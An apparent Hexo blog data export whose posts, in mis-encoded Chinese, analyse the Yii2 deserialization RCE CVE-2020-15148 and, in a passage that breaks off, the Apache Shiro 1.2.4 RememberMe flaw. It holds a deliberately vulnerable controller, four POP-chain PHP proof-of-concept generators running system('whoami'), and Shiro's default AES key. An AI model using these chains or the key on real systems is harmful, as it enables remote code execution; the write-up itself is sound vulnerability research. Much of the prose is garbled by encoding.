{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"å¼ ä¸‰æå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬æå››æˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ç‹äº”æˆ‘æ˜¯å°ç™½ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"ååºåˆ—åŒ–","slug":"CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–","date":"2020-09-21T05:49:01.000Z","updated":"2020-09-22T11:46:45.491Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–","slug":"CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–/CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–","date":"2020-09-21T05:49:01.000Z","updated":"2020-09-22T09:14:29.412Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–/CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"ç¯å¢ƒæ­å»º yiiä¸‹è½½åœ°å€ å½±å“èŒƒå›´ Yii2 &lt; 2.0.38 é€‰æ‹©ä¸€ä¸ªæ¼æ´å½±å“çš„ç‰ˆæœ¬ yii-basic-app-2.0.37.tgzä¸‹è½½åè§£å‹åˆ° web ç›®å½•ä¸‹ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ config/web.php ï¼Œç»™ cookieValidationKey å­—æ®µè®¾ç½®ä¸€ä¸ªå€¼ã€‚ ç„¶åæ·»åŠ ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ Action/controllers/TestController.php 1234567891011121314151617&lt;?phpnamespace app\\controllers;use Yii;use yii\\web\\Controller;class TestController extends Controller{ public function actionTest(){ $name = Yii::$app-&gt;request-&gt;get('unserialize'); return unserialize(base64_decode($name)); }}?&gt; æµ‹è¯•è¿è¡ŒæˆåŠŸ æ¼æ´åˆ†æ åˆ©ç”¨é“¾ 1 æŸ¥çœ‹ github çš„ commit è®°å½• å‘ç°åœ¨ /db/BatchQueryResult.php ä¸­æ–°å¢äº† __wakeup() æ–¹æ³•ï¼Œåœ¨ __wakeup() æ–¹æ³•ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚ unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ åˆ©ç”¨ __wakeup() æ–¹æ³•æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸ºäº†é˜²æ­¢ BatchQueryResult ç±»è¢«ååºåˆ—åŒ–ã€‚ çŒœæµ‹ BatchQueryResult ç±»ä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct 1234567891011121314151617public function __destruct(){ // make sure cursor is closed $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} __destruct ( void ) : voidææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ æ–¹æ³•é‡Œé¢è°ƒç”¨äº† ```reset``` æ–¹æ³•ï¼Œ ```reset``` æ–¹æ³•é‡Œé¢åˆè°ƒç”¨äº† ```close``` æ–¹æ³•ã€‚12345678910111213141516171819```$this-&gt;_dataReader``` çš„å€¼å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å½“ä½œè·³æ¿å»æ‰§è¡Œå…¶ä»–ç±»ä¸­çš„é­”æœ¯æ–¹æ³• ```__call()``` æ–¹æ³•ã€‚ &gt; public __call ( string $name , array $arguments ) : mixed &gt; åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ã€‚ &gt; \\$name å‚æ•°æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åç§°ã€‚\\$arguments å‚æ•°æ˜¯ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼ŒåŒ…å«ç€è¦ä¼ é€’ç»™æ–¹æ³• $name çš„å‚æ•°ã€‚![](20200921162407.png)äº†è§£ ```__call()``` æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œå…¨å±€æœç´¢ï¼Œæ‰¾åˆ°å…¶ä¸­ä¸åŒ…å« ```close```æ–¹æ³•çš„ç±»ï¼Œå°±å¯ä»¥æ‰§è¡Œè¯¥ç±»çš„```__call()``` æ–¹æ³•ã€‚å…¨å±€æœç´¢ ``` function __call( ``` ```vendor/fzaninotto/faker/src/Faker/Generator.php::__call``````phppublic function __call($method, $attributes) { return $this-&gt;format($method, $attributes); } è·Ÿè¿› format vendor/fzaninotto/faker/src/Faker/Generator.php::format 1234public function format($formatter, $arguments = array()){ return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);} format ä¸­è°ƒç”¨äº† call_user_func_array æ–¹æ³• ï¼Œ$formatter ä¸ $agruments æˆ‘ä»¬éƒ½ä¸å¯æ§ã€‚æ­¤æ—¶ $formatter = close,$agrumentsä¸ºç©ºã€‚$formatter ä¼ é€’è‡³ getFormatter()vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter 1234567891011121314public function getFormatter($formatter){ if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));} æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ getFormatter æ–¹æ³•ä¸­ï¼Œ$this-&gt;formatters[$formatter] æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼ŒgetFormatter æ–¹æ³•è¿”å›å€¼æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆ call_user_func_array è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºã€‚æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ yii æ¡†æ¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæ— å‚çš„æ–¹æ³•äº†ã€‚ call_user_func_array ( callable $callback , array $param_arr ) : mixedæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥ã€‚è°ƒç”¨ç±»ä¸­çš„å…¬å…±æ–¹æ³•å¯ä»¥åˆ©ç”¨ call_user_func_array(['ç±»å','ç±»ä¸­çš„æ–¹æ³•'],[]); å…¨å±€æœç´¢ call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+) æ‰¾åˆ°ä½¿ç”¨ call_user_func å‡½æ•°ï¼Œä¸”å‚æ•°ä¸ºç±»ä¸­æˆå‘˜å˜é‡çš„æ‰€æœ‰æ–¹æ³•ã€‚ åˆ©ç”¨å…¶ä¸­çš„ vendor/yiisoft/yii2/rest/CreateAction.php::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} ä»¥åŠ ```$this-&gt;id``` éƒ½å¯æ§123456789101112131415161718192021æ‰€ä»¥åˆ©ç”¨é“¾ä¸ºï¼š&gt; yii\\db\\BatchQueryResult::__destruct() &gt; yii\\db\\BatchQueryResult::reset() &gt; Faker\\Generator::__call() &gt; Faker\\Generator::format('close',[])&gt; call_user_func_array(['new yii\\rest\\CreateAction','run'],[]) &gt; yii\\rest\\CreateAction::run() &gt; call_user_func('system','whoami')```php$n = yii\\db\\BatchQueryResult{ $this-&gt;_dataReader = Faker\\Generator{ $this-&gt;formatters['close'] = [ yii\\rest\\CreateAction{ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } ,'run']; }} POC 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; åˆ©ç”¨é“¾2 BatchQueryResult ç±»ä»ä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œä¸åˆ©ç”¨é­”æœ¯æ–¹æ³• __call()ï¼Œé€‰æ‹©å°† $this-&gt;_dataReader èµ‹å€¼ä¸ºä¸€ä¸ªå­˜åœ¨ close æ–¹æ³•çš„ç±»ï¼Œæ‰¾åˆ°è¯¥ç±»ä¸­ closeæ–¹æ³•è°ƒç”¨ä¸­å­˜åœ¨ä»£ç æ‰§è¡Œã€‚ \\yii2\\web\\DbSession::close 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} å½“ $this-&gt;getIsActive() ä¸º true æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨ $this-&gt;composeFields()è·Ÿè¿› DbSession çš„çˆ¶ç±» MultiFieldSession çš„çˆ¶ç±» Session\\yii2\\web\\Session::getIsActive 1234public function getIsActive() { return session_status() === PHP_SESSION_ACTIVE; } å½“Yiiçš„debugå’Œgiiè¿™ä¸¤ä¸ªé»˜è®¤æ‰©å±•éƒ½å­˜åœ¨ï¼ˆä¸ä¸€å®šè¦å¼€å¯ï¼‰æ—¶ï¼Œè¿™é‡Œè¿”å›trueã€‚å¦åˆ™è¿”å›falseã€‚é»˜è®¤å®‰è£…æƒ…å†µä¸‹éƒ½è¿”å›trueã€‚è·Ÿè¿› composeFields æ–¹æ³•ï¼Œåœ¨DbSession çš„çˆ¶ç±» MultiFieldSession ä¸­å®ç°\\yii\\web\\MultiFieldSession::composeFields 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} å‘ç°è°ƒç”¨äº†call_user_funcå‡½æ•°ï¼Œ $this-&gt;writeCallback å¯æ§ï¼Œå…¶ä½™å‚æ•°ä¸å¯æ§ã€‚å¯ä»¥é€šè¿‡æ§åˆ¶ $this-&gt;writeCallback ä¸º [â€˜ç±»åâ€™,â€™ç±»ä¸­çš„æ–¹æ³•â€™] æ¥å®ç°è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•ã€‚ å…¨å±€æœç´¢ call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+) åˆ©ç”¨å…¶ä¸­çš„ \\yii\\rest\\IndexAction::run 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } return $this-&gt;prepareDataProvider();}``` æ‰€ä»¥åˆ©ç”¨é“¾ä¸ºï¼š&gt; yii\\db\\BatchQueryResult::__destruct() &gt; yii\\db\\BatchQueryResult::reset() &gt; yii\\web\\DbSession::close() &gt; yii\\web\\MultiFieldSession::composeFields() &gt; call_user_func_array(['new yii\\rest\\IndexAction','run'],[]) &gt; yii\\rest\\IndexAction::run() &gt; call_user_func('system','whoami')POC ```php&lt;?phpnamespace yii\\rest { class IndexAction { public $checkAccess; public $id; public function __construct() { $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace yii\\web { use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct() { $this-&gt;writeCallback = [new IndexAction(), \"run\"]; } }}namespace yii\\db { use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct() { $this-&gt;_dataReader = new DbSession(); } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));} åˆ©ç”¨é“¾3 \\Codeception\\Extension\\RunProcess::__destruct 1234public function __destruct() { $this-&gt;stopProcess(); } \\Codeception\\Extension\\RunProcess::stopProcess 123456789101112public function stopProcess() { foreach (array_reverse($this-&gt;processes) as $process) { /** @var $process Process **/ if (!$process-&gt;isRunning()) { continue; } $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine()); $process-&gt;stop(); } $this-&gt;processes = []; } æ³¨æ„åˆ° RunProcess ä¸­çš„ __destruct æ–¹æ³•è°ƒç”¨äº† stopProcess() æ–¹æ³•ï¼Œ stopProcess() æ–¹æ³• ä¸­çš„ $this-&gt;processes å¯æ§ï¼Œåˆ™ $process å¯æ§ï¼Œä¸‹é¢è°ƒç”¨äº† $process-&gt;isRunning() ï¼Œåˆ™åˆå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• __call()ã€‚ åˆ©ç”¨é“¾ \\Codeception\\Extension\\RunProcess::__destruct()\\Codeception\\Extension\\RunProcess::stopProcess()Faker\\Generator::__call()Faker\\Generator::format(â€˜closeâ€™,[])call_user_func_array([â€˜new yii\\rest\\CreateActionâ€™,â€™runâ€™],[])yii\\rest\\CreateAction::run()call_user_func(â€˜systemâ€™,â€™whoamiâ€™) poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; } }}namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-&gt;processes = [new Generator]; } }}namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess));}?&gt;``` ***### åˆ©ç”¨é“¾4 ```\\Swift_KeyCache_DiskKeyCache::__destruct``````phppublic function __destruct(){ foreach ($this-&gt;keys as $nsKey =&gt; $null) { $this-&gt;clearAll($nsKey); }} \\Swift_KeyCache_DiskKeyCache::clearAll 123456789101112public function clearAll($nsKey){ if (array_key_exists($nsKey, $this-&gt;keys)) { foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) { $this-&gt;clearKey($nsKey, $itemKey); } if (is_dir($this-&gt;path.'/'.$nsKey)) { rmdir($this-&gt;path.'/'.$nsKey); } unset($this-&gt;keys[$nsKey]); }} å› ä¸º $nsKey $this-&gt;keys å¯æ§ï¼Œè·Ÿè¿›$this-&gt;clearKey(Â· \\Swift_KeyCache_DiskKeyCache::clearKey 1234567public function clearKey($nsKey, $itemKey){ if ($this-&gt;hasKey($nsKey, $itemKey)) { $this-&gt;freeHandle($nsKey, $itemKey); unlink($this-&gt;path.'/'.$nsKey.'/'.$itemKey); }} å¯æ§ ï¼Œè¿›è¡Œäº†å­—ç¬¦ä¸²çš„æ‹¼æ¥æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• ```__toString``` è§¦å‘åç»­æ“ä½œã€‚123456789101112&gt;__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚![](20200922162854.png)ç„¶åå…¨å±€æœç´¢ ```__toString``` æ–¹æ³•![](20200922163338.png)```\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString``````phppublic function __toString() : string{ return $this-&gt;refers . ($this-&gt;description ? ' ' . $this-&gt;description-&gt;render() : '');} å¯æ§ï¼Œåˆ™åˆå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• ```__call()```ã€‚123456789101112131415åˆ©ç”¨é“¾&gt; \\Swift_KeyCache_DiskKeyCache::__destruct() &gt; \\Swift_KeyCache_DiskKeyCache::clearAll() &gt; \\Swift_KeyCache_DiskKeyCache::clearKey() &gt; \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()&gt; \\Faker\\Generator::__call() &gt; \\Faker\\Generator::format('close',[])&gt; \\call_user_func_array(['new yii\\rest\\CreateAction','run'],[]) &gt; \\yii\\rest\\CreateAction::run() &gt; \\call_user_func('system','whoami')```php Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() å‚è€ƒæ–‡ç«  CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†ææˆ‘æ˜¯æ€ä¹ˆæŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´","slug":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´","date":"2020-08-31T06:37:52.000Z","updated":"2020-09-22T11:46:45.491Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"æ¼æ´ç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚","text":"æ¼æ´ç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ SHIRO-550åœ¨è¯†åˆ«èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ Cookie é‡Œçš„ RememberMe å­—æ®µè§£å¯†,è§£å¯†çš„é¡ºåºä¸ºï¼š æ£€ç´¢cookieä¸­RememberMeçš„å€¼ Base64è§£ç  ä½¿ç”¨AESè§£å¯† ååºåˆ—åŒ– ä½†æ˜¯ï¼ŒAES åŠ å¯†çš„ç§˜é’¥è¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼Œæ¯ä¸ªäººé€šè¿‡æºä»£ç éƒ½å¯ä»¥æ‹¿åˆ° AES åŠ å¯†çš„å¯†é’¥ã€‚æ‰€ä»¥å½“æ”»å‡»è€…å°†æ¶æ„çš„ payload è¿›è¡Œåºåˆ—åŒ–ã€AES åŠ å¯†ã€base64 ç¼–ç ï¼Œä½œä¸º Cookie çš„ RememberMe å­—æ®µå‘é€ã€‚Shiro å°† RememberMe è¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ æ¼æ´åˆ†æ è·å– Apache Shiro å­˜åœ¨æ¼æ´çš„æºä»£ç  123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 ä¿®æ”¹ /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; ç„¶åç”¨ideaå¯¼å…¥mvné¡¹ç›® è®¾ç½®run/debug configurationsï¼Œ æ·»åŠ æœ¬åœ°tomcatç¯å¢ƒ åœ¨ org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin å¤„æ·»åŠ æ–­ç‚¹ï¼Œç„¶ådebug å¼€å¯ tomcat æœåŠ¡ åŠ å¯†è¿‡ç¨‹ ç™»å½•è´¦æˆ·root/secretï¼Œå‹¾é€‰ä¸ŠRemember Meçš„æŒ‰é’®ï¼Œç¨‹åºä¼šåœåœ¨æ–­ç‚¹å¤„ï¼Œç”¨æˆ·åå’Œå¯†ç ä¹Ÿä¼šå­˜å‚¨åœ¨ token ä¸­forgetIdentity é’ˆå¯¹ subject å˜é‡è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› forgetIdentity æ–¹æ³•org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) è°ƒç”¨ forgetIdentity æ„é€ æ–¹æ³•å¤„ç† request å’Œ reponse è¯·æ±‚org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) è·Ÿè¿› removeFrom æ–¹æ³•ï¼Œåœ¨ response å“åº”å¤´ä¸­åŠ å…¥äº†ä¸€äº›cookieä¿¡æ¯ã€‚org.apache.shiro.web.servlet.SimpleCookie#removeFrom å›åˆ° onSuccessfulLogin è°ƒç”¨ rememberIdentity ç”Ÿæˆ cookie ä¸­çš„ remember å­—æ®µã€‚è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) é€šè¿‡ getIdentityToRemember è·å–ç”¨æˆ·çš„èº«ä»½ï¼Œç»§ç»­è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) è°ƒç”¨ convertPrincipalsToBytes æ–¹æ³•å°† accountPrincipals &lt;â€œrootâ€&gt; è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ï¼Œè·Ÿè¿› convertPrincipalsToBytes æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes è½¬æ¢è¿‡ç¨‹ä¸­é¦–å…ˆå¯¹ç”¨æˆ·çš„ id è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶ååˆ©ç”¨ encrypt è¿›è¡ŒåŠ å¯†ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#encrypt åŠ å¯†çš„å¯†é’¥ç”±getEncryptionCipherKey()å¾—åˆ° getEncryptionCipherKey å®é™…ä¸Šæ˜¯å¼€å¤´ä¸­çš„ DEFAULT_CIPHER_KEY_BYTES çš„å¸¸é‡ kPH+bIxk5D2deZiIxcaaaA== å¯†é’¥åˆ†æorg.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey ç»§ç»­å•æ­¥æ‰§è¡Œï¼Œè¿”å› rememberIdentity å‡½æ•° è·Ÿè¿›å‡½æ•° rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentityå¯¹å€¼è¿›è¡Œ base64 ç¼–ç ä¹‹åï¼Œè®¾ç½®åˆ° cookie ä¸­ã€‚ å½“æˆ‘ä»¬å‹¾é€‰ RememberMe é€‰é¡¹æ¡†ä¹‹åï¼Œç‚¹å‡»ç™»é™†ä¹‹åï¼Œåç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ åºåˆ—åŒ–ç”¨æˆ· id å¯¹ç”¨æˆ· id è¿›è¡Œ AES åŠ 